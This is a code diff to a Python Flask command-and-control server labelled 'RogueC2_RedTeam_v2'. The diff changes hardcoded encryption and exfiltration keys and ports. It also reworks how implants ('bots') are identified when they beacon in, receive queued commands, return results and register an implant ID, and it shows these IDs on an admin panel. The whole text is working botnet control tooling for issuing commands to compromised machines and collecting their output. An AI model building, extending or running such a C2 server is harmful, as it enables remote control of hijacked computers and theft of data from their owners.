@@ -13,10 +13,10 @@ app = Flask(__name__)
 app.secret_key = 'RogueC2_RedTeam_v2'
 
 # === Configuration ===
-SECRET_KEY = b'666BabyROGUE!222'
-EXFIL_DECRYPT_KEY = b'magicRogueKey!333'
+SECRET_KEY = b'6767BabyROGUE!&%5'
+EXFIL_DECRYPT_KEY = b'magicRogueSEE!333'
 C2_PORT = 4444
-EXFIL_PORT = 9090
+EXFIL_PORT = 9091
 PAYLOAD_PORT = 8000
 
 # Storage - using defaultdict for better handling
@@ -40,18 +40,18 @@ def decrypt_command(data):
 
 def get_bot_id(client_ip, implant_id=None):
     """Get or create consistent bot ID for an implant"""
+    # Use implant_id as primary identifier, not IP
+    if implant_id:
+        # Create bot ID based on implant hash
+        bot_id = f"bot_{implant_id}"
+        ip_to_bot_id[bot_id] = bot_id  # Store by bot_id, not IP
+        return bot_id
+    
+    # Fallback: use IP with hash if no implant_id
     if client_ip in ip_to_bot_id:
         return ip_to_bot_id[client_ip]
     
-    # Create new bot ID
-    if implant_id:
-        # Use implant's identifier if provided
-        identifier = f"{client_ip}_{implant_id}"
-    else:
-        # Fallback: use IP with hash
-        identifier = client_ip
-    
-    # Create consistent hash-based ID
+    identifier = client_ip
     bot_hash = hashlib.md5(identifier.encode()).hexdigest()[:8]
     bot_id = f"bot_{client_ip.replace('.', '_')}_{bot_hash}"
     ip_to_bot_id[client_ip] = bot_id
@@ -78,7 +78,7 @@ def c2_controller():
         
         # Handle beacon/command
         if decrypted_cmd == "beacon":
-            # Use consistent bot ID
+            # For beacon without implant_id, use IP-based ID (fallback)
             beacon_id = get_bot_id(client_ip)
             
             # Add to connected bots
@@ -91,7 +91,8 @@ def c2_controller():
                     'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                     'beacon_count': 0,
                     'commands_sent': 0,
-                    'results_received': 0
+                    'results_received': 0,
+                    'implant_id': 'unknown'  # Will be updated when identified
                 }
             
             # Update stats
@@ -104,11 +105,11 @@ def c2_controller():
             if commands:
                 command_to_execute = commands.pop(0)
                 response = command_to_execute
-                print(f"[→] Sending command to {beacon_id} ({client_ip}): {command_to_execute}")
+                print(f"[→] Sending command to {beacon_id}: {command_to_execute}")
                 bot_info[beacon_id]['commands_sent'] += 1
             else:
                 response = "pong"
-                print(f"[✓] Beacon #{bot_info[beacon_id]['beacon_count']} from {beacon_id} ({client_ip})")
+                print(f"[✓] Beacon #{bot_info[beacon_id]['beacon_count']} from {beacon_id}")
             
             return encrypt_response(response)
         
@@ -116,34 +117,74 @@ def c2_controller():
             # Store result from implant
             result = decrypted_cmd.replace("result:", "", 1)
             
-            # Find bot ID for this IP
-            beacon_id = get_bot_id(client_ip)
+            # Extract bot_id from result if possible, otherwise use IP
+            beacon_id = None
             
-            if beacon_id:
-                result_entry = {
-                    'result': result,
-                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                    'client_ip': client_ip,
-                    'bot_id': beacon_id
-                }
-                
-                command_results[beacon_id].append(result_entry)
-                bot_info[beacon_id]['results_received'] += 1
-                
-                # Keep only last 10 results
-                if len(command_results[beacon_id]) > 10:
-                    command_results[beacon_id] = command_results[beacon_id][-10:]
-                
-                print(f"[✓] Result from {beacon_id} ({client_ip}): {result[:100]}...")
-            else:
-                print(f"[!] Result from unknown bot: {client_ip}")
+            # Try to find which bot this result belongs to
+            for bot_id in connected_bots:
+                if bot_id in result or client_ip in bot_info.get(bot_id, {}).get('ip', ''):
+                    beacon_id = bot_id
+                    break
+            
+            if not beacon_id:
+                # Create new bot entry if not found
+                beacon_id = get_bot_id(client_ip)
+                if beacon_id not in bot_info:
+                    bot_info[beacon_id] = {
+                        'ip': client_ip,
+                        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                        'beacon_count': 1,
+                        'commands_sent': 0,
+                        'results_received': 0,
+                        'implant_id': 'unknown'
+                    }
+            
+            result_entry = {
+                'result': result,
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'client_ip': client_ip,
+                'bot_id': beacon_id
+            }
+            
+            command_results[beacon_id].append(result_entry)
+            bot_info[beacon_id]['results_received'] += 1
+            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            # Keep only last 10 results
+            if len(command_results[beacon_id]) > 10:
+                command_results[beacon_id] = command_results[beacon_id][-10:]
+            
+            print(f"[✓] Result from {beacon_id}: {result[:100]}...")
             
             return encrypt_response("result_received")
         
         elif decrypted_cmd.startswith("identify:"):
-            # Implant sending identification
-            implant_id = decrypted_cmd.replace("identify:", "", 1)
+            # Implant sending identification - THIS IS KEY
+            implant_id = decrypted_cmd.replace("identify:", "", 1).strip()
+            
+            # Use the implant's actual ID, not IP
             beacon_id = get_bot_id(client_ip, implant_id)
+            
+            # Update connected bots
+            connected_bots.add(beacon_id)
+            
+            # Update bot info with implant_id
+            if beacon_id not in bot_info:
+                bot_info[beacon_id] = {
+                    'ip': client_ip,
+                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                    'beacon_count': 0,
+                    'commands_sent': 0,
+                    'results_received': 0,
+                    'implant_id': implant_id
+                }
+            else:
+                bot_info[beacon_id]['implant_id'] = implant_id
+            
+            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            
+            print(f"[+] Implant identified: {implant_id} -> Bot ID: {beacon_id}")
+            
             return encrypt_response(f"identified:{beacon_id}")
         
         else:
@@ -194,6 +235,7 @@ def admin_panel():
                 {% for bot in bot_list %}
                 <div class="bot {{ 'active-bot' if bot.last_seen_diff < 60 else '' }}">
                     <strong> {{ bot.id }}</strong>
+                    <span class="status">● Implant ID: {{ bot.implant_id }}</span>
                     <span class="status">● Last seen: {{ bot.last_seen }} ({{ bot.last_seen_diff }}s ago)</span>
                     <span class="status">● IP: {{ bot.ip }}</span>
                     <div class="bot-stats">
@@ -350,6 +392,7 @@ def admin_panel():
                     bot_list.append({
                         'id': bot_id,
                         'ip': bot_info[bot_id].get('ip', 'Unknown'),
+                        'implant_id': bot_info[bot_id].get('implant_id', 'unknown'),
                         'last_seen': last_seen_str,
                         'last_seen_diff': seconds_ago,
                         'beacon_count': bot_info[bot_id].get('beacon_count', 0),
